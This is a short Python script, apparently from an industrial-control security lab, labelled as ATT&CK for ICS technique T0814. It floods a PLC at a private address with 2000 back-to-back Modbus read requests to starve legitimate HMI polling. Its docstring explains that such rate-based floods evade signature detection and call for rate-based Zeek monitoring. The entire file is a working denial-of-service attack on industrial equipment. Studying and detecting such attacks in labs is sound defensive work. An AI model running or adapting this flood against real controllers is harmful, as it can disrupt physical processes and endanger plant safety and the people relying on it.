#!/usr/bin/env python3
"""
ATT&CK for ICS T0814 - Denial of Service

Floods the PLC with back-to-back Modbus read requests, far faster than
the HMI's fixed 2s scan cycle. Many embedded Modbus stacks have small
request queues, so volume alone can starve real polling traffic
without ever sending a malformed packet - nothing here looks "wrong"
at the protocol level, only at the rate level. This is why rate-based
Zeek detections (SumStats) matter more than signature-only approaches
for OT protocols.
"""
from pymodbus.client import ModbusTcpClient

PLC_HOST = "172.20.0.10"
PLC_PORT = 502
REQUESTS = 2000

client = ModbusTcpClient(PLC_HOST, port=PLC_PORT)
if client.connect():
    for _ in range(REQUESTS):
        # function code 0x03, back-to-back with no inter-request delay
        client.read_holding_registers(0, 1)
    print(f"sent {REQUESTS} back-to-back read requests")
    client.close()
else:
    print("connection failed")
